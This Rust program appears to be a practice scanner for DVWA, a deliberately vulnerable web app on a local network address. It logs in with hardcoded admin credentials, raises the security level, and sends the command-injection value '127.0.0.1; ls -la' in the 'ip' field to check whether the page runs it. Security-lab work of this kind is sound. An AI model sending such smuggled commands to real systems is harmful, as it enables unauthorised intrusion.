use reqwest::blocking::{Client};
use scraper::{Html, Selector};
use std::collections::HashMap;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::builder().cookie_store(true).build()?;
    let base_url = "http://192.168.1.199/DVWA/";

    match login(&client, base_url) {
        Ok(Some(success)) => {
            println!("Login successful: {}", success);
            set_security_level(&client, base_url)?;
            let cmd_injection = command_injection_scanner(&client, base_url)?;
            match cmd_injection {
                Some(cmd) => println!("Command Injection: {}", cmd),
                None => println!("Command not found"),
            }
        }
        Ok(None) => println!("Login failed"),
        Err(e) => println!("Error: {}", e),
    }

    Ok(())
}

fn login(client: &Client, base_url: &str) -> Result<Option<bool>, Box<dyn std::error::Error>> {
    let login_url = format!("{}{}", base_url, "login.php");
    let password = "senha0425";

    let login_page_response = client.get(&login_url).send()?;
    let login_page_html = login_page_response.text()?;
    let user_token = get_usertoken(&login_page_html)?;

    let response = client
        .post(&login_url)
        .form(&[
            ("username", "admin"),
            ("password", password),
            ("Login", "Login"),
            ("user_token", &user_token),
        ])
        .send()?;

    let response_html = response.text()?;
    if response_html.contains("Login failed") {
        Ok(None)
    } else {
        Ok(Some(true))
    }
}

fn set_security_level(client: &Client, base_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let sec_level_url = format!("{}{}", base_url, "security.php");
    let sec_level_response = client.get(&sec_level_url).send()?;
    let sec_level_html_response = sec_level_response.text()?;
    let user_token = get_usertoken(&sec_level_html_response)?;

    let mut sec_level_params = HashMap::new();
    sec_level_params.insert("security", "high");
    sec_level_params.insert("seclev_submit", "Submit");
    sec_level_params.insert("user_token", &user_token);

    client.post(&sec_level_url).form(&sec_level_params).send()?;
    Ok(())
}

fn command_injection_scanner(
    client: &Client,
    base_url: &str,
) -> Result<Option<String>, Box<dyn std::error::Error>> {
    let cmd_injection_url = format!("{}{}", base_url, "vulnerabilities/exec/");

    let mut cmd_params = HashMap::new();
    cmd_params.insert("ip", "127.0.0.1; ls -la");
    cmd_params.insert("Submit", "Submit");

    let request = client.post(&cmd_injection_url).form(&cmd_params).build()?;
    let full_url = request.url().to_string();
    let cmd_injection_response = client.execute(request)?;
    let cmd_injection_response_html_response = cmd_injection_response.text()?;

    if cmd_injection_response_html_response.contains("index.php") {
        Ok(Some(format!(
            "Found command injection in 'ip' parameter at this URL: {}",
            full_url
        )))
    } else {
        Ok(None)
    }
}

fn get_usertoken(htmlresponse: &str) -> Result<String, Box<dyn std::error::Error>> {
    let document = Html::parse_document(htmlresponse);
    let selector = Selector::parse("input[name='user_token']").unwrap();

    if let Some(input) = document.select(&selector).next() {
        if let Some(token) = input.value().attr("value") {
            return Ok(token.to_string());
        }
    }

    Err("Could not find user_token".into())
}
